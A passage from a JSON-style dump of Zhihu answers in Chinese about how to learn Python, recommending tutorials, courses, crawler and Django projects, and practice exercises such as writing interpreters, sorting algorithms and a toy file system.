则用来存储要爬取的网页队列，也就是任务队列。所以不要被有些看起来很高深的东西吓到了。当你能够写分布式的爬虫的时候，那么你可以去尝试打造一些基本的爬虫架构了，实现一些更加自动化的数据获取。你看，这一条学习路径下来，你已然可以成为老司机了，非常的顺畅。所以在一开始的时候，尽量不要系统地去啃一些东西，找一个实际的项目（开始可以从豆瓣、小猪这种简单的入手），直接开始就好。因为爬虫这种技术，既不需要你系统地精通一门语言，也不需要多么高深的数据库技术，高效的姿势就是从实际的项目中去学习这些零散的知识点，你能保证每次学到的都是最需要的那部分。当然唯一困难的是，刚开始没有经验的时候，在寻找资源、搜索解决问题的方法时总会遇到一些困难，因为往往在最开始，我们去描述清楚具体的问题都很难。如果有大神帮忙指出学习的路径和解答疑问，效率会高不少。这里真诚地推荐我们的系统化爬虫课程：Python爬虫：入门+进阶。清晰高效的学习路径，老师实时答疑。——————————关注公众号（datacastle2016），获取更多数据分析干货。", "praise_num": 262, "answer_object_id": "a82e5bda75c7d5a0a4be4c61656a52c1"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/192385626", "answer_id": 192385626, "comments_num": 19, "answer_article": "1、自己动手写个Web Server 图文结合，作者非常幽默风趣Let’s Build A Web Server. Part 1Let’s Build A Web Server. Part 2Let’s Build A Web Server. Part 3&lt;img src=\"https://pic2.zhimg.com/v2-1fd5f7a31ecbbe2428c4b05071fc7509_b.png\" data-rawwidth=\"1024\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb\" width=\"1024\" data-original=\"https://pic2.zhimg.com/v2-1fd5f7a31ecbbe2428c4b05071fc7509_r.jpg\"&gt;看英文吃力的看翻译版自己动手开发网络服务器（一）\n 自己动手开发网络服务器（二）\n 自己动手开发网络服务器（三）2、自己动手写个解释器，依然是楼上这位高产作者Let’s Build A Simple Interpreter. Part 1.\nLet’s Build A Simple Interpreter. Part 2.\nLet’s Build A Simple Interpreter. Part 3.\nLet’s Build A Simple Interpreter. Part 4.\nLet’s Build A Simple Interpreter. Part 5.\nLet’s Build A Simple Interpreter. Part 6.\nLet’s Build A Simple Interpreter. Part 7.\nLet’s Build A Simple Interpreter. Part 8.\nLet’s Build A Simple Interpreter. Part 9.\nLet’s Build A Simple Interpreter. Part 10.\nLet’s Build A Simple Interpreter. Part 11.\nLet’s Build A Simple Interpreter. Part 12.\nLet’s Build A Simple Interpreter. Part 13.\nLet’s Build A Simple Interpreter. Part 14.照样有人翻译了《一起来写个简单的解释器（1）》\n《一起来写个简单的解释器（2）》\n《一起来写个简单的解释器（3）》\n《一起来写个简单的解释器（4）》\n《一起来写个简单的解释器（5）》\n《一起来写个简单的解释器（6）》\n《一起来写个简单的解释器（7）》\n《一起来写个简单的解释器（8）》烂尾了.....，还是硬着头皮去看原文吧3、如果觉得上面的太难，来个简单了，写个Django博客Django 博客教程：前言\n1 - 搭建开发环境\n2 - 建立 Django 博客应用\n3 - 创建 Django 博客的数据库模型\n4 - 让 Django 完成翻译：迁移数据库\n5 - Django 博客首页视图\n6 - 真正的 Django 博客首页视图\n7 - 在 Django Admin 后台发布文章\n8 - 博客文章详情页\n9 - 支持 Markdown 语法和代码高亮\n10 - 页面侧边栏：使用自定义模板标签\n11 - 分类与归档\n12 - 评论\n13 - 已知小问题修正\n14 - 使用 Nginx 和 Gunicorn 部署 Django 博客\n15 - 使用 Fabric 自动化部署4、如果以上都觉得太无趣，写个爬虫获取能激发你的学习动力，爬网上的在线教程做成电子书https://foofish.net/python-crawler-html2pdf.html&lt;img src=\"https://pic3.zhimg.com/v2-c0982b8c856269a86112cc0de8a5312a_b.png\" data-rawwidth=\"708\" data-rawheight=\"518\" class=\"origin_image zh-lightbox-thumb\" width=\"708\" data-original=\"https://pic3.zhimg.com/v2-c0982b8c856269a86112cc0de8a5312a_r.jpg\"&gt;5、大家都喜欢玩微信，如果用Python来微信，搞个机器人调戏一下妹纸什么的更有意思wxpy: 用 Python 玩微信，可能是最优雅的微信个人号 API&lt;img src=\"https://pic4.zhimg.com/v2-bc52af27d05d1036fe520b17a9bc50c3_b.png\" data-rawwidth=\"750\" data-rawheight=\"1334\" class=\"origin_image zh-lightbox-thumb\" width=\"750\" data-original=\"https://pic4.zhimg.com/v2-bc52af27d05d1036fe520b17a9bc50c3_r.jpg\"&gt;图片来源：biezhi/wechat-robot", "praise_num": 1082, "answer_object_id": "ba7a3279e3e0f7ad2062a30f8845cb3f"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/450054820", "answer_id": 450054820, "comments_num": 43, "answer_article": "代码都是层层抽象的，那么你问一行可以干什么，说不定可以模拟一个世界generateWorld()如果抽象不算，从汇编开始算的话，一行还真干不了什么", "praise_num": 888, "answer_object_id": "2071fa877a706ada6de224739c23e2fe"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/457806145", "answer_id": 457806145, "comments_num": 16, "answer_article": "可以试试 Python 的 from stackoverflow import ... 一个脑洞大开的项目， 会自动导入 Stack Overflow 上该关键字的高票回答里能跑起来的代码，而且通常情况下真的是可用的。&gt;&gt;&gt; from stackoverflow import quick_sort, split_into_chunks\n&gt;&gt;&gt; print(quick_sort.sort([1, 3, 2, 5, 4]))\n[1, 2, 3, 4, 5]\n&gt;&gt;&gt; print(list(split_into_chunks.chunk(\"very good chunk func\")))\n['very ', 'good ', 'chunk', ' func']\n&gt;&gt;&gt; print(\"I wonder who made this\", split_into_chunks.__author__)\nI wonder who made this https://stackoverflow.com/a/35107113\n&gt;&gt;&gt; print(\"but what's the license?\", quick_sort.__license__)\nbut what's the license? CC BY-SA 3.0\n&gt;&gt;&gt; assert(\"nice, attribution!\")\ndrathier/stack-overflow-import​github.com", "praise_num": 393, "answer_object_id": "13385367ce88b0277098f612e8fb36de"},{"answer_url": "https://www.zhihu.com/question/20039623/answer/251224727", "answer_id": 251224727, "comments_num": 54, "answer_article": "直到前一阵子出版社的人联系我，问我愿不愿意出书我才意识到自己写这个专栏已经这么久了最近也老人问我，怎么入门编程，要不要报班等等我是从零基础开始学习的，这里分享一下我的学习过程关于自学和培训班其实我没有什么资格来和大家讨论这个问题，因为我也是刚刚入门而已，并不能指导性的告诉大家应该怎么样我只是说一下自己的看法：自学，不用上培训班！！！首先我自己是完全没有报培训班的，所以觉得也没这个必要其次，如果你想将写代码作为自己的职业，那么自学是必不可少的能力如果什么都得让别人拉着你，那么是不是太被动了？兴趣我没事喜欢逛知乎，有一段时间看到了这个问题：利用爬虫技术能做到哪些很酷很有趣很有用的事情: http://t.cn/RptGOPx觉得回答的一个个炒鸡酷炫就对爬虫产生了浓厚的兴趣，于是就开始了我的一路摸爬滚打文本资料想学写爬虫，Python的基础知识肯定得补起来这里我推荐几本我觉得很棒的入门书籍最好按照顺序阅读，难度是由浅入深的父与子的编程之旅： http://t.cn/R7s2ME8这本书说的都是一些基本的概念，告诉我们编程到底是怎么一回事，初步了解Python的世界。笨方法学Python： http://t.cn/Rie7W7L这本书在知乎上都被推荐烂了，但是的确是一本不可多得的好书。但最后的部分对于零基础的人来说，跨越程度有点大，如果看不懂，可以暂时跳过菜鸟教程 Python3教程 ：http://t.cn/RqM5aF8从这里，就可以完整的掌握Python这门语言的基础语法、类型、函数、面向对象...这里的内容都是最基本的解释，只能告诉你一个大概。但这就是目前的我们所需要的，因为太难的，真的看不懂（比如 线程锁 迭代器 生成器...）简明教程： http://t.cn/RMP60Nw这相对于菜鸟教程，更加的精炼和简介，也是非常的棒！廖雪峰的Python3教程： http://t.cn/RK0qGu7相对于前面的教程来说，廖大的更加深入，我当初是直接看的廖大，看到后面云里雾里，所以完全零基础的小伙伴，还是先尝试其他比较简单的好一点。上面就是我推荐的一些入门的文本资料，最后三个，可以按照自己的水平阅读学习也不一非要按照我推荐的顺序，当然，光看是没用的，上面的例子也要跟着做才能有收获视频慕课有的小伙伴可能一看书就犯困，更喜欢直接一点的视频，我当初是书和视频一起结合着看的下面推荐我上的几门慕课：哈佛大学公开课：计算机科学cs50： http://t.cn/RwvcReG这门课对于我这种文科生来说，简直是福音！！！通过这门课，你可以了解到计算机世界的基础，为你以后的学习打下良好的基础！没看过的同学一定要去看！中国大学慕课：Python语言程序设计 http://t.cn/R6ELBBH这门课录制的水平很高，还有对应的在线习题，学到最后还能有证书拿，每周同步进行的话也不会有太大的压力我还把每周的习题上传到Github了： https://github.com/Ehco1996/PythonPractice中国大学慕课： Python网络爬虫与信息提取： http://t.cn/R6phGd9上面那门慕课老师开设的爬虫课程，很棒很详细，我学习爬虫就是跟着这里入门的！中国大学慕课：用Python玩转数据： http://t.cn/RSN2yYR讲了一些用Python做数据分析的基本方法，老师很有意思，不过前面的章节还涉及到一些基础的部分，可以当做再复习一遍啦嵩天老师的其他Python课程 ： http://t.cn/RptquK8这名老师开设了很多Python课程，各种方向的都有，其实学到这里，可以多多尝试一下，发现自己喜欢的方向看看嵩老师开设的课程：&lt;img src=\"https://pic2.zhimg.com/v2-0ca2abc9045157b1da8cbefaec19c249_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"757\" class=\"origin_image zh-lightbox-thumb\" width=\"985\" data-original=\"https://pic2.zhimg.com/v2-0ca2abc9045157b1da8cbefaec19c249_r.jpg\"&gt;基础掌握之后？当你觉得你已经掌握了Python的基本用法，这个时候就该尝试去『写』一些小项目了，不一定要自己去创造，可以去github上看看有什么适合自己的项目，fork一份到本地，看看别人的代码是怎么样的别人为什么这样写...自己模仿着能写出差不多的东西么？具体可以参考这个知乎问题：Python 的练手项目有哪些值得推荐？https://www.zhihu.com/question/29372574系统的学习爬虫？这里我就推荐三份资料路人甲整理的：一份Python爬虫电子书: https://zhuanlan.zhihu.com/p/28865834甲哥人炒鸡nice啊！但是可能最近工作比较忙~这份资料是他辛苦整理出来的，内容很丰富！崔庆才的爬虫教程 http://cuiqingcai.com/1052.html这个博主也很nice，当初我学着入门的时候也在这里参考了很多资料！我的 从零开始写Python爬虫 专栏 https://zhuanlan.zhihu.com/Ehco-python容我自卖自夸一下，专栏里从基础到实战都有最近也把所有的文章链接都汇总到导言里了：可以看这里： https://zhuanlan.zhihu.com/p/26673214?refer=Ehco-python系统的学习Web？这里我推荐一个超级棒的Django教程：追梦人物的blog： http://zmrenwu.com/post/2/我的blog就是跟着这个教程不断的完善，才有了现在的效果还有一份Python Web开发的知识清单：python web 入坑指南： http://python-web-guide.readthedocs.io/zh/latest/这我还没看完，我准备利用最后这一年上学的时间来学习一下剩下的？全得靠你自己啦一起努力吧！每天的学习记录都会 同步更新到：微信公众号： findyourownway知乎专栏：从零开始写Python爬虫​zhuanlan.zhihu.comGithub： https://github.com/Ehco1996/Python-crawler​github.com", "praise_num": 1556, "answer_object_id": "89b66d79b5c161b00fb7735181da4f21"},{"answer_url": "https://www.zhihu.com/question/20039623/answer/64926634", "answer_id": 64926634, "comments_num": 133, "answer_article": "零基础学编程，用python入门是个不错的选择，虽然国内基本上还是以c语言作为入门开发语言，但在国外，已经有比较多的学校使用python作为入门编程语言。具体怎么选择你的第一门编程语言可以看下图：&lt;img src=\"https://pic3.zhimg.com/8160c14ea69b3a6674152f2c1ae6cd7a_b.jpg\" data-rawwidth=\"2000\" data-rawheight=\"2210\" class=\"origin_image zh-lightbox-thumb\" width=\"2000\" data-original=\"https://pic3.zhimg.com/8160c14ea69b3a6674152f2c1ae6cd7a_r.jpg\"&gt;好吧，废话说完了，下面是正文，零基础怎么学习python。========================正文分割线==========================下面的内容是由浅入深，建议按照先后顺序阅读学习。0.Python简明教程下载地址：python简明教程中文.pdf很简洁的一本教材，就算没有基础，你也可以像读小说一样，花半天时间就可以读完。然后，下面这篇文章可以起到一个快速复习的作用：分分钟学会一门语言之Python篇1.Python 开发教程廖学峰大大的Python教程，我见过的写得最好的Python开发教程之一,包括Python2.7和Python3两个大版本的教程。地址：Python教程 - 廖雪峰的官方网站2.学完基础知识，接下来就是掌握一个实用的开发框架进行实战了。Python有很多Web开发框架,大而全的开发框架非Django莫属,用得也最广泛.有很多公司有使用Django框架,如搜狐,腾讯等。以简洁著称的web.py,flask都非常易于上手,以异步高性能著称的tornado,源代码写得美如画,知乎,Quora都在用。以下是Django框架很不错的学习资料。2-1）Django基础教程被解放的姜戈01 初试天涯被解放的姜戈02 庄园疑云被解放的姜戈03 所谓伊人被解放的姜戈04 各取所需被解放的姜戈05 黑面管家被解放的姜戈06 假作真时被解放的姜戈07 马不停蹄2-2）Django练手项目（使用Django开发博客）:django常用命令django开发博客(1) 入门django开发博客(2) 模板和数据查询django开发博客(3) 静态文件、from应用与自定义django开发博客(4) comments库使用及ajax支持django开发博客(5) markdown支持、代码高亮、gravatar头像服务Django最佳实践(中文版)3. Python实践项目python项目实践一：即时标记python项目实践二：画幅好画python项目实践三：万能的XMLpython项目实践四：新闻聚合python项目实践五：虚拟茶话会python项目实践六：使用CGI进行远程编辑python项目实践七：自定义公告板python项目实践八：使用XML-RPC进行远程文件共享python项目实践十：DIY街机游戏python项目实践九：文件共享2-GUI4. 其他一些比较有用的资源如何入门 Python 爬虫？ - 谢科的回答Python正则表达式指南【干货】Python爬虫/文本处理/科学计算/机器学习/数据挖掘兵器谱Python WSGI详解最后,http://www.the5fire.com/上也有很多好的学习资源.", "praise_num": 11129, "answer_object_id": "f9f3cd601cf3ddec8187f1b415c83902"},{"question_title": "如何在业余时学数据分析？", "question_url": "https://www.zhihu.com/question/22119753", "question_descr": "我是一个web前端开发者和rails程序员，计算机专业出身，掌握Python、Ruby、C、Java编程语言，具有较为扎实的计算机理论基础。", "question_id": 22119753, "answer_num": 130, "followers": 26951, "visitors": 1345696, "topics": "Python,如何学习 X,数据挖掘,数据分析,R（编程语言）", "question_object_id": "5a1835b086d4cb1ad2ff78bd23925f9a", "answer_id_list": "228633346,303533823,152679250,280016005,243669266", "answer_url_list": "https://www.zhihu.com/question/22119753/answer/228633346,https://www.zhihu.com/question/22119753/answer/303533823,https://www.zhihu.com/question/22119753/answer/152679250,https://www.zhihu.com/question/22119753/answer/280016005,https://www.zhihu.com/question/22119753/answer/243669266"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/346927368", "answer_id": 346927368, "comments_num": 7, "answer_article": "回答中提到的资源，都可以在公众号 Crossin的编程教室 中找到。也欢迎关注我们的专栏 Crossin的编程教室，我们将持续更新适合各阶段的练手项目。1. 新手学习阶段编程从一开始就离不开练手，光靠看是不可能看会的。这个阶段最好的方式就是把教程上的例程全部手动输入并成功运行一遍。不要小瞧这个看似很笨的操作，它很重要。只有你自己在电脑上一行行代码敲过，才会发现其中你没有注意到的细节问题，进而有更深刻的理解。大多数情况，你开始自以为原样照抄的代码，就是会有各种报错。这时候你不得不去仔细对比，关注每个细节。对于Python来说，缩进、大小写、括号、引号、代码执行的方式等等，都会是早期的坑。所以切记：不要运行现成的代码，不要直接复制，一定要手动建项目、敲代码、运行。不同的教程会有不同的风格，适合不同的学习者，但相同的一点是里面的例子代码都很重要，甚至我觉得比文字更重要（比如有名的《笨办法学Python》就完全以习题为主）。因此当你选定一本教程之后，务必把其中的例子从头到尾做一遍。以我自己的《Python零基础入门教程》为例：Crossin的编程教室 - Python入门在课程中除了基本的讲解外，还配了一些小案例，如：猜数字 - random罚点球小游戏统计分数 - 文件处理查天气2. 了解基本语法后这时候，你会写代码，但可能还无法掌握“编程思维”。因此需要更多的不同练习，来理解程序的结构、逻辑等。为此，我们专门开辟了一个栏目，定期更新一些小题目供学习者练手。现有的一些题目：替换文件中的敏感信息 黑色星期五 特殊的生日 注册表单验证 数路径 缩小图片尺寸 谁是哪国人？ 矩阵旋转 阿姆斯特朗数 美队盾牌 罗马数字转换 螺旋矩阵 校验文件哈希 验证哥德巴赫猜想 杨辉三角形 神奇的九宫格 求乘积最大 程序猿的浪漫 田忌赛马 乒乓数 囚徒困境 选择困难的农药召唤师 生成词云 特殊回文数统计英文小说词频 双色球选号器 三门问题 记账本 让程序替你等待 3道练习题 查找文件内容 文字竖排查找文件每一期里面会有上一期的解答。在微信里打开可以看到其他同学提交的解答。3. 掌握语言基础后经过一定时间的学习，写过一些小的程序之后，学习者往往会陷入瓶颈：这时候会写代码会做题，但对于真实的软件开发依然缺少认识，一旦程序规模较大就无从下手。在这个阶段，需要有较明确的开发目标，并且对目标做一定的设计和功能划分，然后逐步开发直至完成。这其中会遇到各种问题，在不断解决问题时，你的开发水平和问题解决能力也将随之得到提高。对此，我们制作了一些开发案例，提供问题、解决思路和参考实现。有些案例我们在专栏里也分享过。例如：招聘职位分析电影票比价网寻找押韵词汇IP代理池背单词 - Python高频词汇扫码入库(小程序+django)贪吃蛇大作战声控游戏“皮皮虾，我们走！”此级别的案例基本可以算作完整的个人项目，甚至达到小的商业项目标准。比如就有人看到上述项目后就联系定制开发，而我们之前的读者也有不少在完成类似项目后拿到了满意的工作offer。编程是个理论与实践相结合的事情，并且实践更重要。从简单的程序开始，坚持练习。不要着急，欲速则不达。也不用太在意你做的项目本身是不是够酷炫够高大上。对学习阶段来说，不管好项目坏项目，只要是在写，都不浪费。当你的代码行数积累的一定程度时，你会发现自己的编程能力已经和当年不是一个档次了。其他编程方面的回答和文章：新手引导 | 学编程的弯路 | 如何自学Python | 知乎学Python欢迎关注：Crossin的编程教室（crossincode）", "praise_num": 415, "answer_object_id": "230adfdfc6aea48fa7265d78c1305b4d"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475364790", "answer_id": 475364790, "comments_num": 100, "answer_article": "咳咳...可以表白呀~~Python3：print('\\n'.join([''.join([('TencentCloud'[(x-y)%12]if((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3&lt;=0 else' ')for x in range(-30,30)])for y in range(15,-15,-1)]))&lt;img src=\"https://pic3.zhimg.com/v2-918da6c1708e9df6fd40d200383d099a_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"341\" data-rawheight=\"596\" class=\"content_image\" width=\"341\"&gt;点赞的都会有女（男）朋友的！", "praise_num": 2167, "answer_object_id": "ad950ce0e247a885b26b9a1e7132415e"},{"answer_url": "https://www.zhihu.com/question/20039623/answer/71077682", "answer_id": 71077682, "comments_num": 41, "answer_article": "一、说明面对网络上纷繁复杂的资料，自己真是眼花缭乱，学的毫无章法，东一榔头西一棒子，这样不仅知识不能成为体系，自己的学习进度也不容易掌握，收效甚微。突然有个想法，就是把自己这几天收藏的资料整理出文章出来，方便自己有章可依，逐步走上python小牛的境界……PS:附上一些python相关的好文：1.萧大的编程入门指南知乎获赞无数的编程指南，介绍的不光是一门语言的入门，也是关于编程的入门，谈到了作为一名程序员，应该掌握的一些计算机知识。2. Python 编码风格指南中译版（Google SOC）3. PythonTab中文网------二、Python社区1. Python Tip社区强烈推荐Python Tip,有刷题挑战赛，同时，也有很多在线教程！练手实操必备！2. 啄木鸟社区3. 编程指南社区Co三、入门阶段介绍一些入门的资料，对于有编程经验的同学来讲，入门资料学习并不是很费力。1.简明教程入门教程里，简明教程算是细节介绍相对详细的了，知识面也覆盖的挺全，入门资料的好选择。2.笨办法学python坚持看完了，尽管最后几章没去实现（主要是和我现在的需求不一致，不想花精力在那个上面）。有所收获吧，但是，确实是入门的，知识不全面，入门够用，风格特别，采用问答形式，学习过程挺有趣。3.Python|Codecademy在线挑战，还没用过，貌似现在对英文资料心里还有种抵触，必须克服！！！4.实验楼python研发工程师包含了Linux/Vim/Git/SQL/Python/Django/Flask等学习课程。6.老齐的零基础学Python（第二版）github版本，教程内容覆盖很全，也有实战项目介绍。7.廖雪峰python2.7教程现在已经有python3的教程了。8.Vamei的的python快速教程话说，我还加入了博主的粉丝群，后来加入了微信群，逗比一枚啊，现在好像去新加坡深造去了！博客文章还是很详细的~总结到这儿我已经有乱花渐入迷人眼的感觉了！光是入门就这么多资料，看的过来吗？看完得到猴年马月啊！所以必须痛下决心，选择自己觉得好的就OK！青菜萝卜，各有所爱，别人觉得好的，可能在你这儿就是看着不舒服！好吧，自己就选择简明，笨办法，crossin，还有，codecademy!ok,暂时就这样了！四、充实阶段入门之后，对于这个语言的细节需要更进一步的了解，那么提升阶段必不可少。同时，对于计算机基础不好的同学，了解计算机及编程相关背景知识也很关键。1.《Python基础教程》根据自己学习javascript的经验，一本好的教材真是获益匪浅，它能让你明白很多底层的东西。比如红宝书《js高级程序设计》中关于闭包、原型链的讲解就非常详细！好吧，扯远了，因此，学习python也是一样，光是靠博客，在线文章是不能深入了解它的，选择一门经典教材是你深入了解一门语言的必经之路！当然，也有推荐《Python核心编程（第二版）》的，但是自己只买了《Python基础教程》因此，不做评价了，选中一本经典就可以了！何况自己离吃透它，还有很远的距离的！2. MIT计算机科学及编程导论3. Harvard:计算机科学cs502和3属于计算机入门课，之所以放到这儿，是因为介绍了计算机领域中相关的知识点，了解数据结构相关知识。其中，MIT的导论课老师的知识点是基于Python的，在学习时也能巩固Python。编程入门指南中强烈推荐的的两门公开课。（PS：网易真是良心，这两门课都有中英字幕的视频！）4. Crossin教室除了python教程之外，还有小程序，练手很好！在第一阶段入门之后，来这里做应用小程序，会找到成就感！除此之外，还有git等其他教程。是个不错的入门练手的地方。五、升华阶段有了扎实的基础，那么方向的选择显得尤为重要了。是数据分析，是web开发，还是游戏开发。下面暂时分为这三个方面整理一下：5.1 数据分析1. 《利用Python进行数据分析》这本书是一本大而全的利用Python数据分析的书，数据分析入门肯定够够的，写的也很详细。书的作者就是开发了用于数据分析的著名开源Python库——pandas的作者！2. scientific-python-lectures英文资料，对Python数据分析中要用到的一些库，pandas,numpy,matplotlib等等做了简要介绍。Ipython Notebook形式的资料，示例代码都很全。3. Matplotlib Tutorial(译)Python制图的入门资料，强烈推荐！在线版的资料，作者排版也很舒服，示例代码也有，推荐！4. 用Python做科学计算最新发现的科学计算很棒的综合性教程，更新到这儿，需要的同学自取！强烈推荐！5.2 web开发1. 自强学堂Django基础教程很详细的一个Django教程，作者很详细的介绍了每一步。有问题，作者回复也很详细，推荐！同时，自强学堂上也有很多其他教程，是个不错的网站，收藏！2. Django搭建简易博客教程建议和1结合看，1的介绍相对更详细一点。3. 欢迎进入Flask大型教程项目4. Flask指南5.3 游戏开发1. 用Python和Pygame写游戏-从入门到精通六、 计算机素养1.《深入理解计算机系统》七、 Python面试题1. 聊聊Python面试那些事儿欢迎回访个人博客☺Python入门资料大全(更新ing)-----------------------------------------------更新-----------------------------------------------Python机器学习入门资料整理", "praise_num": 1122, "answer_object_id": "7d5ea503532b932461f2b761fdf76fbd"},{"question_title": "如何系统地自学 Python？", "question_url": "https://www.zhihu.com/question/29138020", "question_descr": "零基础情况下，想学一门语言。另 《Python 编程入门经典》这本书怎么样，是否值得看？", "question_id": 29138020, "answer_num": 213, "followers": 44244, "visitors": 3367206, "topics": "学习,Python,编程,计算机", "question_object_id": "e6f1048db775df6a5a2ac9bb2361d3fd", "answer_id_list": "428156754,81972368,72193349,141170242,394020225", "answer_url_list": "https://www.zhihu.com/question/29138020/answer/428156754,https://www.zhihu.com/question/29138020/answer/81972368,https://www.zhihu.com/question/29138020/answer/72193349,https://www.zhihu.com/question/29138020/answer/141170242,https://www.zhihu.com/question/29138020/answer/394020225"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/44394791", "answer_id": 44394791, "comments_num": 21, "answer_article": "首先两点建议：最好不要写太应用的程序练手，如果你发现你写程序的大部分时间都在查库手册（或者类似的事情），那就是大家所说的“搬砖”了；要思考什么更像是知识，什么只是经验，还是那句老话：要有造轮子的水平，和不造轮子的觉悟；老只会写写爬虫是造不出什么像样的轮子出来的对于练手的程序，要注意简化和抽象，譬如某些可能会说“写一个小数据库、迷你操作系统”之类的，咋一听好像会很有收获，但是如果简化不得当的话，很容易看几篇教程就被懒得下手了，生活就是这样，你要知道什么只是冲动，什么才是实用。后面我会举例子说明如何简化项目Python的练手项目以 计算机科学中有哪些典型的练手项目？ - 知乎 为基础，然后再加上Python自己的特性。至于那些看似具有Python特色的语言特性，要么就是把常见的设计模式打包成了语法糖，发明了些关键字，譬如生成器、装饰器、描述器；或者就是整合其他古老语言的特点，譬如从SmallTalk那里来的元类、从Scheme那里来的闭包。算法系列－排序与查找Python写swap很方便，就一句话（a, b = b, a），于是写基于比较的排序能短小精悍。刚上手一门新语言练算法最合适不过了，还能顺便刷题，利于找工作。就算法本身而言的话，你还可以考虑写写一些常见的改进，譬如快排的stable实现、加栈的非递归实现，你甚至还可以试试快排的各种partition策略（Lomuto，Hoare），再自己改改轴值直观体验下不同轴值的区别，然后甚至可以自己试试简单的轴值选择优化，譬如三次取平均之类的。还有像折半查找的算法写100遍不为过。复杂的查找可以写二叉树、平衡二叉树、2-3树到红黑树（考虑如何在Python表示树？）不是老有人喜欢以自己能白板写红黑树为豪吗。简单的练习，让你受益无穷。编译系列首先的简化是不要指望一口气写一个完整的C编译器，即使只针对C一个很小的子集，还完全不做优化，没有中间代码，这样其实也够你折腾的。所以我们首先把整个后端全部省略，再把词法分析和语法分析简化到极致，写一个计算器的解释器是很好的开始，譬如解释（1+2）*3 这样一个简单的算式，其实已经包含了计算机的本质——计算，计算的本质其实就是解释。你可以先用Dijkstra的中缀转后缀表达式算法（Shunting-yard，我最喜欢的算法之一）来解释一个算式，进而研究下如何对算术表达式进行语法分析，试着用上下文无关文法来表示一个计算器的语法，然后构造抽象语法树来解释一个算式。再进一步可以写一个极简语言的解释器，譬如brainfuck，写它的解释器比看懂它的hello world程序还要容易（其实还有许多这种类似的esoteric语言，譬如whitespace），用Python实现的代码量大概是50行左右， 之后你回头再看brainfuck的语法，会恍然大悟，图灵机的本质原来就是读写存储器和条件跳转！如果你正在上或者将要上编译原理课的话，可以练习Thompson的算法把正则表达式构造成NFA，思路完全一样，只是对运算符的解释不同，然后可以再练练NFA转DFA子集构造法、或正则表达式直接直接构造DFA，然后顺便学学最小化DFA的算法。这是该课的经典作业之一，我们当年也都是用Python做的。对于正则表达式直接直接构造DFA的练习的话，可以自己实现一个flex，譬如，先把模式转成DFA，再把DFA们并联成一个NFA，再模拟这个NFA运行。再进一步你可以扩展已有的计算器解释器，譬如加入声明、赋值与运算、循环、流程控制， 构成一个简单的LL(1)语法，然后递归下降分析，这就可以搞一个简易同时又图灵完备的玩具语言出来了。另外你也可以写个简单的stack machine，体会一下这种虚拟机的解释执行和前面计算器的解释执行的联系与区别。具体请看这个加州理工的作业（很简单）。CS 11: C track: assignment 8如果觉得简单的stack machine不够过瘾的话，可以写个简单的JVM，支持些最基本的字节码。这有个SJSU的练习：A Java Implementation of the Java Virtual Machine (JVM)在学过了理论计算机基础以后，你甚至还可以写个下推自动机和图灵机的解释器（模拟器），类似于这个：Tools如果你在课上还顺便了解了lambda calculus，你甚至还可以再写个lambda calculus的解释器。在这个基础上，如果你再进一步，你甚至还可以继续写个scheme的简易解释器，Peter Norvig有教程：(How to Write a (Lisp) Interpreter (in Python))当然你还可以稍微加点专业的内容，譬如解释器的一种常用实现方式叫threaded interpreting，大致思路就是把switch case改写一个哈希表，从操作码直接跳转到对应实现函数，从而避免用switch case跳来跳去处理每一个操作码。但是用Python这种类型安全的语言无法直接实现threaded interpreting，可能需要用某些变种。当然这些你都得写成你的Python版本。分布式系统/计网系列首先可以写一个简单的HTTP客户端了，原因很简单，因为HTTP大概是最简单的应用层协议了。Python又自带socket库，更简单了，zeromq也有Python版。这个客户端的任务就是和服务器建立TCP连接，然后把该发的东西打包成HTTP格式，什么第二行是空行啊什么的，然后发出去。再支持下所有请求方法，这样可以逼着你去读RFC2616。然后可以考虑实现一个基本的ssh，你大概每天都会用ssh，难道不想做一个自己的简易版本吗？加密的那一部分可以模仿TLS那样，服务器先发公钥，客户端用这个公钥加密一个对称密钥发回去，然后以后都用对称密钥通信，客户端输入的内容直接发给服务器，服务器操作以后的结果再发给客户端，这就是一个简单的ssh了，你甚至还可以加入对X11 Forwarding的支持。然后可以考虑分布式系统课上的经典作业，譬如写一个简单的RPC。在写RPC之前你最好先用用，了解用法以后再去写。可以参考Java的RPC原理以及Google的RPC框架（有Python版）。再譬如写一个P2P分享系统，没有多台电脑可以用多个虚拟机（网络编程里经常需要这样），虚拟机管理系统推荐：Vagrant。操作系统系列内存管理部分没什么可练手的，尤其还是用Python这种非系统编程语言；进程管理的话可以写个多层次的round robin调度算法，你不需要去调度真正的进程，模拟一下进程就行；同步的话可以试试用Python自带的Mutex，Semaphore写常见的并发模型，哲学家吃饭、生产消费之类的。你甚至还可以用实例感受一下CPython被大家诟病的加了解释器全局锁的鸡肋的多线程（Concurrent但不Parallell），譬如写一个复杂的算式分成几个独立的部分分给各线程然后在你的多核的机器上跑，看看跟单线程有何区别，你还可以想想CPython中在什么情况下线程可以真正Parallel起来？并发的部分可以写写几个经典的并发场景（重点推荐），把互斥锁、cv、semaphore等最常见的几个锁模型都用用，譬如生产者消费者模型，用用Python的thread模块，同时了解下Global Interpreter Lock以及它导致了什么问题。经典的多线程编程是学习新语言很好的练习方式，能让你动脑子。存储管理的话可以写一个简单的文件系统，这个稍微复杂一点。第一步的简化就是用一个大的空文件作为磁盘，就不用专门找个真磁盘或者U盘了，把对磁盘的读写抽象成对这个文件的读写。基本就是实现下inode，然后包装成一个shell，支持下最基本的命令，新建、追加、读写、删除之类的操作。这个练习最有趣也最有意义的地方在于多级索引的实现，有一个VSFS的教程，C++写起来大概1600行，Python更少:http://pages.cs.wisc.edu/~remzi/OSTEP/file-implementation.pdf周边系列你也可以试试Jython，IronPython之类的，看看和CPython比如何。然后再试试Pypy，必然是一开始很高兴，最后发现各种常见库不支持，最后还是转回CPython。做实验的话用IPython把Python函数当命令跑很方便。这些例子每一个都不复杂，大部分我自己当年都写过，最多几百行，从头到尾写下来，你会发现你不仅熟练了Python，算法、操作系统、计网、编译原理的基础也顺便复习了。一箭无数雕。", "praise_num": 389, "answer_object_id": 